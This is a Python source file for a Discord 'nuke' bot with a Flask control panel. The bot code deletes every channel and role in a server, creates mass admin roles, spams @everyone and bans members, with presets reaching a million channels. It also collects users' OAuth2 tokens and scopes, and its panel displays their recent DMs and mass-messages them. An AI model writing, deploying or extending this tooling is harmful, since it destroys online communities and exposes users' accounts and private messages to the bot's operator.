# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║        5sz8 Discord Bot — ULTIMATE MERGED EDITION           ║
║  discord.py==2.3.2  flask==3.0.3  PyNaCl==1.5.0            ║
║  requests==2.31.0                                           ║
╚══════════════════════════════════════════════════════════════╝
"""
import discord
from discord.ext import commands
from flask import Flask, render_template_string, request, redirect, session
import threading, asyncio, os, json, datetime, random, string, secrets
import base64, hashlib, requests as req_lib

# ─────────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────────
TOKEN         = os.environ.get("BOT_TOKEN", "")
OWNER_ID      = int(os.environ.get("OWNER_ID", ""))
PANEL_PASS    = os.environ.get("PANEL_PASS", "")
PREFIX        = "!"
PORT          = int(os.environ.get("PORT", 8000))

# OAuth2
CLIENT_ID     = os.environ.get("CLIENT_ID", "")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "")
REDIRECT_URI  = os.environ.get("REDIRECT_URI", "https://your-host.example.com/callback")
ENCRYPT_KEY   = hashlib.sha256(os.environ.get("ENCRYPT_KEY", "5sz8_ultimate_2026").encode()).digest()

DISCORD_API   = "https://discord.com/api/v10"

# ─────────────────────────────────────────────────────────────
#  COLORS
# ─────────────────────────────────────────────────────────────
C_OK    = 0x57F287
C_ERR   = 0xED4245
C_WARN  = 0xFEE75C
C_INFO  = 0x5865F2
C_NB    = 0xC0392B
C_BAN   = 0xE74C3C
C_MOD   = 0xE91E63
C_VOICE = 0x1ABC9C
C_ROLE  = 0xF39C12
C_CHAN  = 0x9B59B6
C_MENT  = 0xE67E22
C_CLR   = 0x2C3E50
C_NUKE  = 0xFF0000

# ─────────────────────────────────────────────────────────────
#  PERSISTENCE — Trusted Users
# ─────────────────────────────────────────────────────────────
TRUSTED_FILE = "trusted.json"
NOBACK_FILE  = "noback_list.json"

trusted_users: list = []

def load_trusted():
    global trusted_users
    try:
        with open(TRUSTED_FILE) as f:
            trusted_users = json.load(f)
        if OWNER_ID not in trusted_users:
            trusted_users.append(OWNER_ID)
    except:
        trusted_users = [OWNER_ID]

def save_trusted():
    with open(TRUSTED_FILE, 'w') as f:
        json.dump(trusted_users, f, indent=2)

load_trusted()

noback_data: dict = {}

def load_noback():
    global noback_data
    try:
        with open(NOBACK_FILE) as f:
            noback_data = json.load(f)
    except:
        noback_data = {}

def save_noback():
    with open(NOBACK_FILE, 'w') as f:
        json.dump(noback_data, f, indent=2)

load_noback()

# ─────────────────────────────────────────────────────────────
#  PERSISTENCE — Nuke Data
# ─────────────────────────────────────────────────────────────
NUKE_FILE = "nuke_data.json"
nuke_data: dict = {}

def load_nuke():
    global nuke_data
    try:
        with open(NUKE_FILE) as f:
            nuke_data = {int(k): v for k, v in json.load(f).items()}
    except:
        nuke_data = {}

def save_nuke():
    with open(NUKE_FILE, 'w') as f:
        json.dump({str(k): v for k, v in nuke_data.items()}, f, default=str, indent=2)

load_nuke()

# ─────────────────────────────────────────────────────────────
#  PERSISTENCE — OAuth2 User Tokens (encrypted)
# ─────────────────────────────────────────────────────────────
TOKEN_FILE   = "user_tokens.json"
user_tokens: dict = {}

def enc(t: str) -> str:
    c = []
    for i, ch in enumerate(t):
        c.append(chr(ord(ch) ^ ENCRYPT_KEY[i % len(ENCRYPT_KEY)]))
    return base64.b64encode(''.join(c).encode()).decode()

def dec(enc_str: str):
    try:
        c = base64.b64decode(enc_str).decode()
        p = []
        for i, ch in enumerate(c):
            p.append(chr(ord(ch) ^ ENCRYPT_KEY[i % len(ENCRYPT_KEY)]))
        return ''.join(p)
    except:
        return None

def save_tokens():
    d = {}
    for uid, td in user_tokens.items():
        d[str(uid)] = {
            "access":   enc(td["access"]),
            "refresh":  enc(td["refresh"]) if td.get("refresh") else None,
            "expires":  td.get("expires"),
            "username": td.get("username", "Unknown"),
            "scopes":   td.get("scopes", [])
        }
    with open(TOKEN_FILE, 'w') as f:
        json.dump(d, f, indent=2)

def load_tokens():
    global user_tokens
    try:
        with open(TOKEN_FILE) as f:
            d = json.load(f)
            user_tokens = {}
            for uid_str, td in d.items():
                at = dec(td["access"])
                if at:
                    user_tokens[int(uid_str)] = {
                        "access":   at,
                        "refresh":  dec(td["refresh"]) if td.get("refresh") else None,
                        "expires":  td.get("expires"),
                        "username": td.get("username", "Unknown"),
                        "scopes":   td.get("scopes", [])
                    }
    except:
        user_tokens = {}

load_tokens()

# ─────────────────────────────────────────────────────────────
#  PERM PRESETS
# ─────────────────────────────────────────────────────────────
PERM_PRESETS = {
    'admin':    discord.Permissions(administrator=True),
    'streamer': discord.Permissions(stream=True, speak=True, connect=True,
                                    use_voice_activation=True, send_messages=True,
                                    embed_links=True, attach_files=True),
    'mod':      discord.Permissions(ban_members=True, kick_members=True,
                                    manage_messages=True, mute_members=True,
                                    deafen_members=True, move_members=True),
    'manager':  discord.Permissions(manage_guild=True, manage_roles=True,
                                    manage_channels=True, manage_nicknames=True,
                                    manage_webhooks=True),
}

# ─────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────
def is_owner(uid: int) -> bool:
    return uid == OWNER_ID

def is_trusted(uid: int) -> bool:
    return uid == OWNER_ID or uid in trusted_users

def strip_id(raw: str) -> int:
    return int(raw.strip('<@!&#>'))

def eb(title: str, desc: str, color: int, footer: str = None) -> discord.Embed:
    e = discord.Embed(title=title, description=desc, color=color,
                      timestamp=datetime.datetime.utcnow())
    if footer:
        e.set_footer(text=footer)
    return e

def make_embed(title: str, desc: str, color: int = C_INFO) -> discord.Embed:
    return discord.Embed(title=title, description=desc, color=color,
                         timestamp=datetime.datetime.utcnow())

# ─────────────────────────────────────────────────────────────
#  NUKE STATE — active flag & stop helper
# ─────────────────────────────────────────────────────────────
nuke_active: bool = False

async def stop_spam():
    """Signal the running nuke to stop creating channels/spam."""
    global nuke_active
    nuke_active = False
    await asyncio.sleep(0.1)

# ─────────────────────────────────────────────────────────────
#  NUKE HELPERS
# ─────────────────────────────────────────────────────────────
async def safe_del_ch(ch):
    try: await ch.delete(); return True
    except: return False

async def safe_del_role(r):
    try: await r.delete(); return True
    except: return False

async def safe_make_ch(g, name):
    try: return await g.create_text_channel(name)
    except: return None

async def safe_make_role(g, name, color=0xFF0000, perms=discord.Permissions(8)):
    try: return await g.create_role(name=name, color=discord.Color(color), permissions=perms, mentionable=True)
    except: return None

async def safe_ban(g, m, reason="5sz8 Nuke"):
    try: await g.ban(m, reason=reason, delete_message_days=0); return True
    except: return False

async def safe_kick(g, m, reason="5sz8 Nuke"):
    try: await m.kick(reason=reason); return True
    except: return False

async def safe_send(ch, content):
    try: await ch.send(content); return True
    except: return False

async def safe_edit_g(g, **kw):
    try: await g.edit(**kw); return True
    except: return False

async def backup_guild(guild):
    backup = {
        "name": guild.name,
        "description": guild.description,
        "icon": str(guild.icon.url) if guild.icon else None,
        "afk_channel_id": guild.afk_channel.id if guild.afk_channel else None,
        "afk_timeout": guild.afk_timeout,
        "channels": [], "roles": [],
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    for role in sorted(guild.roles, key=lambda r: r.position, reverse=True):
        if role.name == "@everyone": continue
        backup["roles"].append({
            "name": role.name, "color": role.color.value,
            "permissions": role.permissions.value,
            "hoist": role.hoist, "mentionable": role.mentionable
        })
    for ch in guild.channels:
        cd = {"name": ch.name, "type": str(ch.type), "position": ch.position}
        if isinstance(ch, discord.TextChannel):
            cd["topic"] = ch.topic or ""
            cd["slowmode"] = ch.slowmode_delay
            cd["nsfw"] = ch.nsfw
        elif isinstance(ch, discord.VoiceChannel):
            cd["bitrate"] = ch.bitrate
            cd["user_limit"] = ch.user_limit
        backup["channels"].append(cd)
    return backup

# ─────────────────────────────────────────────────────────────
#  NUKE ENGINE
# ─────────────────────────────────────────────────────────────
class NukeReport:
    def __init__(self):
        self.ch_del = 0; self.ro_del = 0; self.ch_crt = 0; self.ro_crt = 0
        self.banned = 0; self.kicked = 0; self.msgs = 0; self.errs = 0
        self.start = datetime.datetime.utcnow()

    def elapsed(self):
        return round((datetime.datetime.utcnow() - self.start).total_seconds(), 1)

    def embed(self, gname, author, new_name=None):
        e = discord.Embed(
            title="💀 **NUKE COMPLETE** 💀",
            description=f"**Server:** {gname}" + (f"\n**New Name:** {new_name}" if new_name else ""),
            color=0xFF0000, timestamp=datetime.datetime.utcnow())
        e.add_field(name="🗑️ Ch Deleted",  value=f"**{self.ch_del:,}**",  inline=True)
        e.add_field(name="🏅 Ro Deleted",  value=f"**{self.ro_del:,}**",  inline=True)
        e.add_field(name="📢 Ch Created",  value=f"**{self.ch_crt:,}**",  inline=True)
        e.add_field(name="👑 Ro Created",  value=f"**{self.ro_crt:,}**",  inline=True)
        e.add_field(name="🔨 Banned",      value=f"**{self.banned:,}**",   inline=True)
        e.add_field(name="💢 Kicked",      value=f"**{self.kicked:,}**",   inline=True)
        e.add_field(name="💬 Spam",        value=f"**{self.msgs:,}**",     inline=True)
        e.add_field(name="⚠️ Errors",      value=f"**{self.errs:,}**",    inline=True)
        e.add_field(name="⏱️ Duration",    value=f"**{self.elapsed()}s**", inline=True)
        e.set_footer(text=f"By {author.display_name} | 5sz8 Ultimate")
        return e


async def execute_nuke(guild,
                       create_channels=50, create_roles=50,
                       new_name="5sz8-NUKED",
                       spam_msg="@everyone **5sz8 NUKED** 💀",
                       spam_count=15,
                       do_ban=True):
    global nuke_active
    r = NukeReport()
    bot_m = guild.me
    bot_top = bot_m.top_role if bot_m else None

    # Phase 1: Delete all channels
    for ch in list(guild.channels):
        if not nuke_active: break
        if await safe_del_ch(ch): r.ch_del += 1
        else: r.errs += 1
        await asyncio.sleep(0.05)

    # Phase 2: Delete all roles
    roles_del = [role for role in guild.roles
                 if role.name != "@everyone" and role != bot_top
                 and not role.managed and role < (bot_top or guild.default_role)]
    for role in roles_del:
        if not nuke_active: break
        if await safe_del_role(role): r.ro_del += 1
        else: r.errs += 1
        await asyncio.sleep(0.05)

    # Rename server
    await safe_edit_g(guild, name=new_name)

    # Phase 3: Create roles
    created_roles = []
    for i in range(min(create_roles, 500)):
        if not nuke_active: break
        role = await safe_make_role(guild, f"5sz8-Admin-{i+1}")
        if role:
            created_roles.append(role)
            r.ro_crt += 1
        else:
            r.errs += 1
        await asyncio.sleep(0.03)

    if created_roles:
        async for m in guild.fetch_members(limit=None):
            if m == bot_m or m.bot: continue
            try: await m.add_roles(*created_roles[:min(5, len(created_roles))])
            except: pass

    # Phase 4: Create channels and spam
    created_chs = []
    for i in range(min(create_channels, 500)):
        if not nuke_active: break
        ch = await safe_make_ch(guild, f"nuked-{i+1}")
        if ch:
            created_chs.append(ch)
            r.ch_crt += 1
        else:
            r.errs += 1
        await asyncio.sleep(0.03)

    for ch in created_chs:
        if not nuke_active: break
        for _ in range(spam_count):
            if not nuke_active: break
            if await safe_send(ch, spam_msg): r.msgs += 1
            await asyncio.sleep(0.05)

    # Phase 5: Ban all members
    if do_ban and nuke_active:
        async for m in guild.fetch_members(limit=None):
            if not nuke_active: break
            if m == bot_m or m.bot or m.id == OWNER_ID: continue
            if m == guild.owner: continue
            try:
                if await safe_ban(guild, m): r.banned += 1
                elif await safe_kick(guild, m): r.kicked += 1
            except:
                if await safe_kick(guild, m): r.kicked += 1
            await asyncio.sleep(0.05)

    nuke_active = False
    return r


async def nuke_server(guild, create_channels=500, create_roles=500,
                      new_name="5sz8-NUKED",
                      spam_msg="@everyone Server Nuked by 5sz8 Bot",
                      spam_count=15):
    """Wrapper: saves backup, runs execute_nuke, returns report."""
    global nuke_active
    try:
        nuke_data[guild.id] = {"backup": await backup_guild(guild),
                               "timestamp": datetime.datetime.utcnow().isoformat()}
        save_nuke()
    except: pass
    nuke_active = True
    return await execute_nuke(guild,
                              create_channels=create_channels,
                              create_roles=create_roles,
                              new_name=new_name,
                              spam_msg=spam_msg,
                              spam_count=spam_count)

# ─────────────────────────────────────────────────────────────
#  NUKE PRESETS
# ─────────────────────────────────────────────────────────────
NUKE_PRESETS = [
    ("Default", 50,      50,      "5sz8-NUKED",     "@everyone **5sz8 NUKED** 💀",      15),
    ("Massive", 500,     250,     "5sz8-DESTROYED", "@everyone **BYE BYE** 💀",          20),
    ("Extreme", 100,     100,     "5sz8-EXTREME",   "@everyone **EXTREME NUKE** 💀",     30),
    ("Light",   20,      10,      "5sz8-LITE",      "@everyone **LITE NUKE**",            5),
    ("Max",     1000000, 1000000, "5sz8-MAXED",     "@everyone **MAX NUKE** 💀",          50),
]

# Reaction emoji → preset index mapping
REACTION_PRESETS = {
    "1️⃣": (500,   500,   "5sz8-NUKED",    "@everyone Server Nuked by 5sz8 Bot",    15),
    "2️⃣": (1000,  1000,  "MASSIVE-NUKE",  "@everyone MASSIVE NUKE by 5sz8 Bot",    20),
    "3️⃣": (5000,  5000,  "EXTREME",       "@everyone EXTREME NUKE by 5sz8 Bot",    30),
    "4️⃣": (100,   100,   "LIGHT",         "@everyone Light Nuke by 5sz8 Bot",       5),
    "5️⃣": (10000, 10000, "MAX-NUKE",      "@everyone MAX NUKE by 5sz8 Bot",        50),
}

def format_presets():
    lines = []
    for i, (name, ch, ro, new_n, msg, cnt) in enumerate(NUKE_PRESETS):
        lines.append(f"`{i+1}` — **{name}** (ch: {ch:,}, ro: {ro:,}, spam: {cnt})")
    return '\n'.join(lines)

# ─────────────────────────────────────────────────────────────
#  FLASK WEB PANEL
# ─────────────────────────────────────────────────────────────
PANEL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>5sz8 Bot Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a0f;--bg2:#111118;--bg3:#1a1a24;--border:#222233;--accent:#5865f2;
  --green:#57f287;--red:#ed4245;--yellow:#fee75c;--text:#e0e0f0;--muted:#666688}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;min-height:100vh}
a{color:inherit;text-decoration:none}
.topbar{background:var(--bg2);padding:14px 28px;display:flex;align-items:center;
  justify-content:space-between;border-bottom:2px solid var(--accent);position:sticky;top:0;z-index:10}
.topbar h1{font-size:17px;color:#fff;font-weight:700}
.badge{background:var(--red);color:#fff;font-size:10px;padding:2px 9px;border-radius:20px;margin-left:8px}
.logout{color:var(--muted);font-size:13px;border:1px solid var(--border);padding:5px 14px;border-radius:6px}
.wrap{max-width:1100px;margin:26px auto;padding:0 16px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin-bottom:22px}
.stat{background:var(--bg3);border:1px solid var(--border);border-radius:12px;padding:18px;text-align:center}
.stat .n{font-size:26px;font-weight:700;color:var(--accent)}
.stat .l{color:var(--muted);font-size:12px;margin-top:3px}
.sec{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:20px}
.sec h2{font-size:14px;color:#fff;margin-bottom:14px;padding-bottom:9px;border-bottom:1px solid var(--border)}
table{width:100%;border-collapse:collapse}
th{text-align:left;color:var(--muted);font-size:11px;padding:6px 10px;border-bottom:1px solid var(--border)}
td{padding:9px 10px;border-bottom:1px solid #14141e;font-size:13px;vertical-align:middle}
tr:last-child td{border:none}
code{background:#1e1e2e;padding:2px 7px;border-radius:4px;font-size:12px;color:#a8b4fc}
.b-own{background:#f0b13222;color:#f0b132;padding:2px 9px;border-radius:20px;font-size:11px;border:1px solid #f0b13244}
.b-tr{background:#57f28718;color:var(--green);padding:2px 9px;border-radius:20px;font-size:11px;border:1px solid #57f28733}
.btn{display:inline-block;padding:6px 14px;border-radius:6px;border:none;cursor:pointer;font-size:12px;font-weight:600;transition:.15s}
.b-bl{background:var(--accent);color:#fff}.b-bl:hover{background:#4752c4}
.b-r{background:#ed424518;color:var(--red);border:1px solid #ed424533}.b-r:hover{background:var(--red);color:#fff}
.b-g{background:#57f28718;color:var(--green);border:1px solid #57f28733}.b-g:hover{background:var(--green);color:#000}
.rf{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
.rf input,.rf-in{flex:1;min-width:150px;background:var(--bg);border:1px solid var(--border);color:var(--text);
  padding:9px 12px;border-radius:7px;font-size:13px;outline:none}
.rf input:focus{border-color:var(--accent)}
.cmds{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:9px}
.cmd{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:12px 14px}
.cmd .cn{color:var(--accent);font-size:12px;font-weight:700}
.cmd .al{color:var(--green);font-size:11px;margin-top:1px}
.cmd .ds{color:var(--muted);font-size:11px;margin-top:4px}
.lw{display:flex;align-items:center;justify-content:center;min-height:100vh}
.lb{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:38px;width:100%;max-width:340px;text-align:center}
.lb h2{color:#fff;font-size:21px;margin-bottom:22px}
.lb input{width:100%;background:var(--bg);border:1px solid var(--border);color:#fff;
  padding:11px 14px;border-radius:8px;font-size:14px;margin-bottom:12px;outline:none}
.lb input:focus{border-color:var(--accent)}
.lb button{width:100%;background:var(--accent);color:#fff;border:none;padding:11px;
  border-radius:8px;font-size:14px;cursor:pointer;font-weight:700}
.err{color:var(--red);font-size:12px;margin-bottom:10px;background:#ed424514;
  padding:7px 11px;border-radius:6px;border:1px solid #ed424530}
.empty{color:#333355;text-align:center;padding:18px;font-size:13px}
.uc{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:12px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
.cat{color:var(--yellow);font-size:11px;font-weight:700;margin:14px 0 6px;text-transform:uppercase;letter-spacing:.5px}
.cat-nuke{color:#ff6b6b;font-size:11px;font-weight:700;margin:14px 0 6px;text-transform:uppercase;letter-spacing:.5px}
</style>
</head>
<body>
{% if not logged_in %}
<div class="lw"><div class="lb">
  <h2>🔐 5sz8 Panel</h2>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST">
    <input type="password" name="password" placeholder="Password" autofocus>
    <button type="submit">Login</button>
  </form>
</div></div>
{% else %}
<div class="topbar">
  <div style="display:flex;align-items:center">
    <h1>💀 5sz8 Bot Panel</h1><span class="badge">● LIVE</span>
  </div>
  <a class="logout" href="/panel/logout">Logout</a>
</div>
<div class="wrap">

  <div class="stats">
    <div class="stat"><div class="n">{{ server_count }}</div><div class="l">Servers</div></div>
    <div class="stat"><div class="n">{{ oauth_count }}</div><div class="l">OAuth2 Users</div></div>
    <div class="stat"><div class="n">{{ noback_count }}</div><div class="l">NoBack</div></div>
    <div class="stat"><div class="n">{{ trusted_count }}</div><div class="l">Trusted</div></div>
    <div class="stat"><div class="n">{{ nuke_count }}</div><div class="l">Nuke Backups</div></div>
  </div>

  <!-- Trusted Users -->
  <div class="sec"><h2>⭐ Trusted Users</h2>
    <form method="POST" action="/panel/add-trusted" class="rf">
      <input name="user_id" placeholder="User ID to trust">
      <button class="btn b-bl">➕ Add</button>
    </form>
    {% if trusted_list %}
    <table><thead><tr><th>ID</th><th>Type</th><th>Action</th></tr></thead><tbody>
    {% for uid, utype in trusted_list %}
    <tr><td><code>{{ uid }}</code></td>
    <td>{% if utype=='owner' %}<span class="b-own">👑 Owner</span>{% else %}<span class="b-tr">⭐ Trusted</span>{% endif %}</td>
    <td>{% if utype!='owner' %}
    <form method="POST" action="/panel/remove-trusted" style="display:inline">
      <input type="hidden" name="user_id" value="{{ uid }}">
      <button class="btn b-r">Remove</button></form>{% endif %}</td></tr>
    {% endfor %}</tbody></table>
    {% else %}<div class="empty">No trusted users</div>{% endif %}
  </div>

  <!-- NoBack List -->
  <div class="sec"><h2>⛔ NoBack List</h2>
    <form method="POST" action="/panel/add-noback" class="rf">
      <input name="guild_id" placeholder="Server ID">
      <input name="user_id" placeholder="User ID">
      <button class="btn b-r">⛔ Add</button>
    </form>
    {% if noback_list %}
    <table><thead><tr><th>User ID</th><th>Server ID</th><th>Action</th></tr></thead><tbody>
    {% for gid, uid in noback_list %}
    <tr><td><code>{{ uid }}</code></td><td><code>{{ gid }}</code></td>
    <td><form method="POST" action="/panel/unnoback" style="display:inline">
      <input type="hidden" name="guild_id" value="{{ gid }}">
      <input type="hidden" name="user_id" value="{{ uid }}">
      <button class="btn b-r">Remove</button></form></td></tr>
    {% endfor %}</tbody></table>
    {% else %}<div class="empty">NoBack list is empty</div>{% endif %}
  </div>

  <!-- OAuth2 Users -->
  <div class="sec"><h2>👥 OAuth2 Connected Users ({{ oauth_count }})</h2>
    {% if oauth_users %}
    {% for uid, info in oauth_users %}
    <div class="uc">
      <div>
        <strong>{{ info.username }}</strong> <code>{{ uid }}</code><br>
        <small style="color:var(--muted)">Scopes: {{ info.scopes|join(', ') }}</small>
      </div>
      <div>
        <a href="/panel/user/{{ uid }}" class="btn b-bl" style="color:#fff">View</a>
        <a href="/panel/send/{{ uid }}" class="btn b-g" style="color:#000">DM</a>
      </div>
    </div>
    {% endfor %}
    {% else %}<div class="empty">No OAuth2 users connected yet. Share the login link!</div>{% endif %}
    {% if oauth_users %}
    <form method="POST" action="/panel/msg-all" class="rf" style="margin-top:12px">
      <input name="content" placeholder="Message to send to ALL users" required>
      <button class="btn b-bl">📨 DM All</button>
    </form>
    {% endif %}
  </div>

  <!-- Commands -->
  <div class="sec"><h2>📋 Commands — prefix <code>!</code></h2>

  <div class="cat">💀 Nuke</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!nuke</div><div class="al">!nuke [ch] [ro] [name] [msg]</div><div class="ds">Full nuke (1 to 1,000,000) — react to pick preset or pass args</div></div>
    <div class="cmd"><div class="cn">!snuke</div><div class="al">!snuke [ch] [ro] [name] [msg]</div><div class="ds">Fast nuke with less delay</div></div>
    <div class="cmd"><div class="cn">!restore</div><div class="ds">Stop active nuke OR restore server from auto-backup</div></div>
    <div class="cmd"><div class="cn">!nukestatus</div><div class="al">!ns</div><div class="ds">Check backup status</div></div>
    <div class="cmd"><div class="cn">!nukehelp</div><div class="al">!nh</div><div class="ds">Detailed nuke help</div></div>
  </div>

  <div class="cat">🔐 Trust</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!trust</div><div class="al">!tr @user/ID</div><div class="ds">Add trusted user</div></div>
    <div class="cmd"><div class="cn">!untrust</div><div class="al">!utr @user/ID</div><div class="ds">Remove trusted user</div></div>
    <div class="cmd"><div class="cn">!trustlist</div><div class="al">!tl</div><div class="ds">Show trust list</div></div>
  </div>

  <div class="cat">⛔ NoBack</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!noback</div><div class="al">!nb @user/ID</div><div class="ds">Permanent IP ban + auto-reban</div></div>
    <div class="cmd"><div class="cn">!unnoback</div><div class="al">!unb @user/ID</div><div class="ds">Remove from NoBack</div></div>
    <div class="cmd"><div class="cn">!nblist</div><div class="al">!nbl</div><div class="ds">Show NoBack list</div></div>
  </div>

  <div class="cat">🔨 Moderation</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!ban</div><div class="al">!ban @user/ID reason</div><div class="ds">Ban a member</div></div>
    <div class="cmd"><div class="cn">!unban</div><div class="al">!unban ID</div><div class="ds">Unban a user</div></div>
    <div class="cmd"><div class="cn">!kick</div><div class="al">!k @user reason</div><div class="ds">Kick a member</div></div>
    <div class="cmd"><div class="cn">!mute</div><div class="al">!m @user minutes reason</div><div class="ds">Timeout a member</div></div>
    <div class="cmd"><div class="cn">!unmute</div><div class="al">!um @user</div><div class="ds">Remove timeout</div></div>
  </div>

  <div class="cat">🏅 Roles</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!makeme</div><div class="al">!mm admin/streamer/mod/manager</div><div class="ds">Give yourself a preset role</div></div>
    <div class="cmd"><div class="cn">!giverole</div><div class="al">!gr @user role_name</div><div class="ds">Give role to member</div></div>
    <div class="cmd"><div class="cn">!removerole</div><div class="al">!rr @user role_name</div><div class="ds">Remove role from member</div></div>
    <div class="cmd"><div class="cn">!createrole</div><div class="al">!cr name [color]</div><div class="ds">Create a role</div></div>
    <div class="cmd"><div class="cn">!deleterole</div><div class="al">!dr role_name</div><div class="ds">Delete a role</div></div>
  </div>

  <div class="cat">💬 Channels</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!createchannel</div><div class="al">!cc name count text/voice</div><div class="ds">Create channel(s)</div></div>
    <div class="cmd"><div class="cn">!deletechannel</div><div class="al">!dch #channel</div><div class="ds">Delete a channel</div></div>
  </div>

  <div class="cat">🔊 Voice</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!vc</div><div class="ds">Bot joins your voice channel</div></div>
    <div class="cmd"><div class="cn">!jv</div><div class="al">!jv channel_id</div><div class="ds">Join voice by ID</div></div>
    <div class="cmd"><div class="cn">!lv</div><div class="ds">Bot leaves voice</div></div>
    <div class="cmd"><div class="cn">!vk</div><div class="al">!vk @user</div><div class="ds">Kick from voice</div></div>
  </div>

  <div class="cat">📋 Other</div>
  <div class="cmds">
    <div class="cmd"><div class="cn">!mention</div><div class="al">!mn @user/role msg</div><div class="ds">Mention a user or role</div></div>
    <div class="cmd"><div class="cn">!clear</div><div class="al">!c amount</div><div class="ds">Delete messages</div></div>
    <div class="cmd"><div class="cn">!serverinfo</div><div class="al">!si</div><div class="ds">Server info</div></div>
    <div class="cmd"><div class="cn">!userinfo</div><div class="al">!ui @user</div><div class="ds">Discord user info</div></div>
    <div class="cmd"><div class="cn">!users</div><div class="ds">List OAuth2 users (owner)</div></div>
    <div class="cmd"><div class="cn">!msgtouser</div><div class="al">!mtu ID msg</div><div class="ds">DM OAuth2 user (owner)</div></div>
    <div class="cmd"><div class="cn">!msgall</div><div class="al">!msgall msg</div><div class="ds">DM all OAuth2 users (owner)</div></div>
  </div>

  </div>
</div>
{% endif %}
</body></html>"""

USER_VIEW_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>User - 5sz8</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#0a0a0f;color:#e0e0f0;padding:24px}
h1{color:#ed4245;margin-bottom:8px;font-size:20px}
a{color:#5865f2;text-decoration:none}
.card{background:#111118;border:1px solid #222233;border-radius:10px;padding:16px;margin-bottom:16px}
.card h3{color:#5865f2;margin-bottom:10px;font-size:14px}
input[type=text]{background:#0a0a0f;border:1px solid #222233;color:#e0e0f0;padding:8px 12px;border-radius:6px;font-size:13px;width:300px;margin-right:8px}
.btn{padding:8px 16px;border-radius:6px;border:none;cursor:pointer;font-size:12px;font-weight:600;color:#fff;background:#238636}
code{background:#1e1e2e;padding:2px 6px;border-radius:4px}
.dm{border-bottom:1px solid #14141e;padding:6px 0}
.dm:last-child{border:none}
.dm-time{color:#666688;font-size:10px}
.dms{max-height:400px;overflow-y:auto;background:#0a0a0f;border-radius:6px;padding:10px}
</style></head>
<body>
<h1>👤 {{ username }} <code>{{ uid }}</code></h1>
<a href="/panel">← Back to Panel</a>
<div class="card" style="margin-top:14px">
  <h3>📊 Info</h3>
  <p>ID: <code>{{ uid }}</code></p>
  <p>Username: {{ username }}</p>
  <p>Scopes: {{ scopes }}</p>
</div>
<div class="card">
  <h3>📨 Send DM</h3>
  <form action="/panel/send-to-user" method="post">
    <input type="hidden" name="uid" value="{{ uid }}">
    <input type="text" name="content" placeholder="Message" required>
    <button type="submit" class="btn">Send</button>
  </form>
</div>
<div class="card">
  <h3>💬 Recent DMs (last 20)</h3>
  <div class="dms">
  {% for dm in dms %}
  <div class="dm">
    <strong>{{ dm.author }}</strong>: {{ dm.content }}
    <div class="dm-time">{{ dm.time }}</div>
  </div>
  {% else %}
  <p style="color:#666688">No messages or failed to fetch</p>
  {% endfor %}
  </div>
</div>
</body></html>"""

web = Flask(__name__)
web.secret_key = secrets.token_hex(32)

@web.route('/')
def home():
    return '✅ 5sz8 Bot is Online!', 200

@web.route('/health')
def health():
    return '{"status":"ok"}', 200

@web.route('/panel', methods=['GET', 'POST'])
def panel():
    li = session.get('logged_in', False)
    err = None
    if request.method == 'POST' and not li:
        if request.form.get('password') == PANEL_PASS:
            session['logged_in'] = True
            li = True
        else:
            err = '❌ Wrong password'
    nb_list = [(gid, uid) for gid, ids in noback_data.items() for uid in ids]
    tl = [(str(OWNER_ID), 'owner')] + [(str(u), 'trusted') for u in trusted_users if u != OWNER_ID]
    rdy = bot.is_ready()
    return render_template_string(PANEL_HTML,
        logged_in=li, error=err,
        server_count=len(bot.guilds) if rdy else 0,
        oauth_count=len(user_tokens),
        noback_count=len(nb_list),
        trusted_count=len(tl),
        nuke_count=len(nuke_data),
        trusted_list=tl,
        noback_list=nb_list,
        oauth_users=list(user_tokens.items()))

@web.route('/panel/add-trusted', methods=['POST'])
def p_add_tr():
    if not session.get('logged_in'): return redirect('/panel')
    try:
        uid = int(request.form.get('user_id', '').strip())
        if uid not in trusted_users:
            trusted_users.append(uid)
            save_trusted()
    except: pass
    return redirect('/panel')

@web.route('/panel/remove-trusted', methods=['POST'])
def p_rm_tr():
    if not session.get('logged_in'): return redirect('/panel')
    try:
        uid = int(request.form.get('user_id', '').strip())
        if uid in trusted_users and uid != OWNER_ID:
            trusted_users.remove(uid)
            save_trusted()
    except: pass
    return redirect('/panel')

@web.route('/panel/add-noback', methods=['POST'])
def p_add_nb():
    if not session.get('logged_in'): return redirect('/panel')
    gid = request.form.get('guild_id', '').strip()
    uid = request.form.get('user_id', '').strip()
    if gid and uid:
        noback_data.setdefault(gid, [])
        if uid not in noback_data[gid]:
            noback_data[gid].append(uid)
            save_noback()
    return redirect('/panel')

@web.route('/panel/unnoback', methods=['POST'])
def p_rm_nb():
    if not session.get('logged_in'): return redirect('/panel')
    gid = request.form.get('guild_id')
    uid = request.form.get('user_id')
    if gid in noback_data and uid in noback_data[gid]:
        noback_data[gid].remove(uid)
        save_noback()
    return redirect('/panel')

